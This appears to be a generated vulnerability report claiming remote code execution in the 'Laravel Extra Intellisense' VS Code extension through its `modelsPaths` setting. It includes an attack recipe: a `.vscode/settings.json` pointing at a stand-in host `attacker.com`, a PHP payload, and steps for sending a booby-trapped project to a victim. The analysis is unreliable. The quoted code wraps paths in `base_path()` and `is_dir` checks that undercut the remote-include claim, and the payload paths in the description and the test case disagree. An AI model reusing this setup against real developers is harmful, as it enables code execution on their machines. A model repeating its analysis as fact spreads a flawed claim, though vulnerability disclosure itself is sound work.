### Vulnerability List:

* Vulnerability Name: Code Injection via `modelsPaths` Configuration
    * Description:
        1. Attacker creates a malicious Laravel project and includes a `.vscode/settings.json` file.
        2. In `.vscode/settings.json`, the attacker sets `LaravelExtraIntellisense.modelsPaths` to an array containing a URL pointing to a malicious PHP file hosted on an attacker-controlled server (e.g., `["//attacker.com/malicious.php"]`).
        3. The victim opens the malicious Laravel project in VS Code with the "Laravel Extra Intellisense" extension installed and activated.
        4. When the extension initializes, specifically when `EloquentProvider.loadModels()` is executed, it constructs a PHP script. This script includes an `include_once` statement that uses the paths defined in `LaravelExtraIntellisense.modelsPaths` setting.
        5. The extension executes this PHP script using the `runLaravel` helper function.
        6. The `include_once` statement in the executed PHP script attempts to include and execute the malicious PHP file from the URL specified in `LaravelExtraIntellisense.modelsPaths`.
        7. The PHP code from the attacker's server is executed on the victim's machine within the context of the VS Code extension, leading to Remote Code Execution.
    * Impact: Remote Code Execution (RCE). An attacker can execute arbitrary code on the victim's machine simply by the victim opening a malicious Laravel project in VS Code with the vulnerable extension installed.
    * Vulnerability Rank: Critical
    * Currently Implemented Mitigations: None. The extension directly uses the paths provided in the `modelsPaths` configuration without any validation or sanitization.
    * Missing Mitigations:
        - **Input Sanitization and Validation:** The extension must sanitize and validate the paths provided in the `LaravelExtraIntellisense.modelsPaths` configuration. It should ensure that the paths are valid, point to local directories within the workspace, and prevent the use of external URLs or absolute paths outside the workspace.
        - **Secure Path Handling:** Avoid using `include_once` or similar functions with user-provided paths directly without strict validation. If dynamic inclusion is necessary, implement robust path sanitization and validation to prevent Local File Inclusion and Remote File Inclusion vulnerabilities.
    * Preconditions:
        - The victim must have the "Laravel Extra Intellisense" extension for VS Code installed and activated.
        - The victim must open a malicious Laravel project in VS Code that is provided by the attacker.
        - The attacker must be able to create and include a `.vscode/settings.json` file in the malicious project to configure the `LaravelExtraIntellisense.modelsPaths` setting.
    * Source Code Analysis:
        ```typescript
        // File: ..\vscode-laravel-extra-intellisense\src\EloquentProvider.ts
        // Function: loadModels

        loadModels() {
            var self = this;
            try {
                Helpers.runLaravel(
                    "foreach (['" + vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<Array<string>>('modelsPaths', ['app', 'app/Models']).join('\', \'') + "'] as $modelPath) {" +
                    "   if (is_dir(base_path($modelPath))) {" +
                    "      foreach (scandir(base_path($modelPath)) as $sourceFile) {" +
                    "         if (substr($sourceFile, -4) == '.php' && is_file(base_path(\"$modelPath/$sourceFile\"))) {" +
                    "             include_once base_path(\"$modelPath/$sourceFile\");" + // Vulnerable line: User-controlled path in include_once
                    "         }" +
                    "      }" +
                    "   }" +
                    "}" +
                    "..."
                ).then(function (result) {
                    let models = JSON.parse(result);
                    self.models = models;
                }).catch(function (e) {
                    console.error(e);
                });
            } catch (exception) {
                console.error(exception);
            }
        }
        ```
        - The code retrieves the `modelsPaths` configuration using `vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<Array<string>>('modelsPaths', ['app', 'app/Models'])`.
        - This configuration value, which is user-controlled through `.vscode/settings.json`, is directly embedded into a PHP code string.
        - The `include_once base_path(\"$modelPath/$sourceFile\")` line is vulnerable because `$modelPath` is directly derived from the user-provided `modelsPaths` configuration without sanitization, allowing for injection of arbitrary paths, including URLs.
        - When `runLaravel` executes this PHP code, it attempts to include and execute PHP files from the attacker-specified locations.

    * Security Test Case:
        1. **Attacker Setup:**
            - Set up a web server under attacker's control (e.g., `attacker.com`).
            - Create a malicious PHP file named `malicious.php` on the attacker's web server with the following content:
              ```php
              <?php
              file_put_contents(__DIR__ . '/rce_vulnerability_proof.txt', 'Successfully achieved RCE!');
              ?>
              ```
        2. **Malicious Project Creation:**
            - Create a new directory named `malicious-laravel-project`.
            - Inside `malicious-laravel-project`, create a subdirectory named `.vscode`.
            - Inside `.vscode`, create a file named `settings.json` with the following content:
              ```json
              {
                  "LaravelExtraIntellisense.modelsPaths": ["//attacker.com"]
              }
              ```
            - Zip the `malicious-laravel-project` directory into `malicious-laravel-project.zip`.
        3. **Victim Execution:**
            - Send the `malicious-laravel-project.zip` file to the victim.
            - Instruct the victim to:
                - Extract `malicious-laravel-project.zip` to a directory on their local machine.
                - Open the extracted `malicious-laravel-project` directory in VS Code.
                - Ensure the "Laravel Extra Intellisense" extension is installed and activated.
        4. **Verification:**
            - After the victim opens the project and the extension initializes, check if a file named `rce_vulnerability_proof.txt` has been created in the root directory of the `malicious-laravel-project` on the victim's machine.
            - If `rce_vulnerability_proof.txt` exists and contains the text "Successfully achieved RCE!", the vulnerability is confirmed. This indicates that the malicious PHP code from the attacker's server was successfully executed by the extension, leading to Remote Code Execution.
